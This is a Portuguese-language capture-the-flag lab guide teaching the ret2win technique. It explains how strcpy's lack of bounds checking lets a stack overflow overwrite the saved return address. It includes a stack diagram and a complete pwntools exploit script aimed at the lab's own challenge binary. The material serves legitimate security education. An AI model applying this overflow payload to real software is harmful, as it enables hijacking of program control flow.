# Sequestrando o RIP para a Função Win()

## Briefing da Missão
Em auditorias de segurança ofensiva de código binário fechado (Black-Box Testing), analistas frequentemente descobrem sub-rotinas de depuração, backdoors de desenvolvedores ou funções internas de diagnóstico que executam ações de privilégio máximo, mas que não possuem chamadas no fluxo normal da aplicação.

No binário desta missão, o desmonte estático revelou a existência da função `win()` localizada no endereço `0x00000000004011f6`. Paralelamente, uma rotina vulnerável de cópia de strings permite transbordar a pilha de execução. Sua missão é compreender a técnica clássica de **Return-to-Win (ret2win)**, identificar o comportamento falho da função insegura e redirecionar o Instruction Pointer (`RIP`) para executar a rotina de vitória.

---

## Teoria Aprofundada & Relação com o Diagnóstico 2026.2

No diagnóstico do ciclo 2026.2:
* **100% dos membros acertaram a Questão Q04** (identificando `strcpy` como função insegura).
* No entanto, **100% erraram o papel do registrador RIP** (Questão Q09).

Este desafio constrói a ponte conceitual que une os dois conhecimentos: saber **por que** a falha de `strcpy` permite o sequestro do registrador `RIP`.

### Por que `strcpy` Transborda a Memória?

A função `strcpy` da biblioteca padrão C (`string.h`) possui a seguinte assinatura:
```c
char *strcpy(char *dest, const char *src);
```
O algoritmo interno de `strcpy` em assembly opera em um laço cego:
1. Lê um byte de `src`.
2. Escreve esse byte em `dest`.
3. Compara o byte com `\0` (byte nulo terminador de string).
4. Se não for nulo, incrementa os ponteiros e repete o ciclo.

**A função nunca consulta o tamanho alocado para `dest`!** Se `dest` tem 64 bytes e `src` tem 120 bytes, `strcpy` continuará escrevendo na memória, atropelando o `Saved RBP` e o `Saved RIP`.

### Diagrama do Ataque ret2win

```
ESTADO NORMAL DA PILHA (Antes da Cópia):
[ Endereços Altos ]
  0x7fffffffe050:  0x0000000000401340  <-- Saved RIP legítimo (Retorno para main)
  0x7fffffffe048:  0x7fffffffe080      <-- Saved RBP
  0x7fffffffe008:  [ buffer (64 B) ]   <-- Alocado para variáveis locais
[ Endereços Baixos ]

ESTADO CORROMPIDO APÓS EXPLOIT:
[ Endereços Altos ]
  0x7fffffffe050:  0x00000000004011f6  <-- SAVED RIP SOBRESCRITO COM win()!
  0x7fffffffe048:  0x4141414141414141  <-- RBP esmagado com 'A's
  0x7fffffffe008:  "AAAAAAAAAAAAAAAA"  <-- Buffer saturado com 64 'A's
[ Endereços Baixos ]
```

Ao atingir a instrução `ret`:
```assembly
ret    ; Executa: pop rip -> Carrega 0x004011f6 no registrador RIP!
```
A CPU salta imediatamente para a função `win()` e lê a flag de vitória!

---

## Passo a Passo de Resolução

1. Execute o desafio para inspecionar os parâmetros da missão:
   ```bash
   /challenge/pwn-win-function-redirection
   ```
2. Para estudar a aula didática sobre ret2win e exploits em Pwntools:
   ```bash
   /challenge/pwn-win-function-redirection --help
   ```
3. O desafio questiona qual função clássica da biblioteca padrão C causa o buffer overflow por ausência de bounds checking:
   - A) strncpy (Segura - possui parâmetro de tamanho)
   - B) strcpy (Insegura - cópia cega até byte nulo)
   - C) snprintf (Segura - formatação com limite)
   - D) fgets (Segura - leitura com limite de buffer)
4. Selecione a opção **`B`** (ou passe `B` / `strcpy` diretamente como argumento).
5. O debriefing técnico demonstrará o sequestro de RIP e imprimirá a flag.

---

## Dicas e Comandos de Terminal

- **Script de Exploit ret2win Completo com Pwntools:**
  ```python
  from pwn import *
  
  elf = ELF("/challenge/pwn-win-function-redirection", checksec=False)
  win_addr = 0x4011f6  # Endereço da win()
  offset = 72          # 64 bytes de buffer + 8 bytes de RBP
  
  # Payload empacotado em Little-Endian (64 bits):
  payload = b"A" * offset + p64(win_addr)
  
  p = process("/challenge/pwn-win-function-redirection")
  p.sendline(payload)
  print(p.recvall().decode())
  ```
- **Inspecionando Símbolos com Nm ou Readelf:**
  ```bash
  nm /challenge/pwn-win-function-redirection | grep win
  readelf -s /challenge/pwn-win-function-redirection | grep win
  ```

---

## Aplicação Prática no Mundo Real

A técnica ret2win é a introdução fundamental à moderna exploração de binários. Embora sistemas modernos utilizem proteções como ASLR (Address Space Layout Randomization) e Stack Canaries, os princípios demonstrados aqui (cálculo de offset, sobrescrita de ponteiro de retorno e controle de registradores) são a base para técnicas avançadas de ROP (Return-Oriented Programming) utilizadas em exploits contra navegadores web, sistemas embarcados e kernels de sistemas operacionais.
